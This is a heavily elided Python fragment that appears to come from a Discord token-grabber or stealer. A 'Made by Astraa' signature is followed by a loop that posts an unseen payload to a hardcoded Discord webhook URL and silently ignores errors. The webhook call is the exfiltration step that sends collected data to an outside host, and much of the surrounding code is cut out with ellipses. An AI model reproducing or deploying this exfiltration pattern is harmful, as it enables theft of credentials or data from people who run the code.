...
*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
                        ...
                        try:
                            ...
                            req = Request('https://discord.com/api/webhooks/1252934865272311818/-hqDNrL17aPyK-Y8BHILspPDIK6t7OshAxXDrIw8eVl0_K1q7_pvGNNbcHnQccyCH84R', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
